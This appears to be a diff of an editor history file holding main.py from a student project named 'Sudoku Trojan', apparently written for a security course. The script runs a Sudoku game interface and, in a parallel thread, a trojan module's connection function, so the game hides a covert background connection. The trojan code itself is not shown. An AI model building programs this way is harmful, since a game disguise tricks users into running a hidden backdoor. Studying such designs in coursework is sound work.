@@ -1,0 +1,9 @@
+file:///home/kali/Desktop/projekat/sbes_superproject/Sudoku%20Trojan/main.py {"mtime":1624708093896,"ctime":1624708093896,"size":201,"etag":"375bs789q6f","orphaned":false,"typeId":""}
+import  threading
+import GUI
+import trojan
+if __name__ == '__main__':
+    t1 = threading.Thread(target=GUI.play)
+    t2 = threading.Thread(target=trojan.connection)
+    t1.start()
+    t2.start()
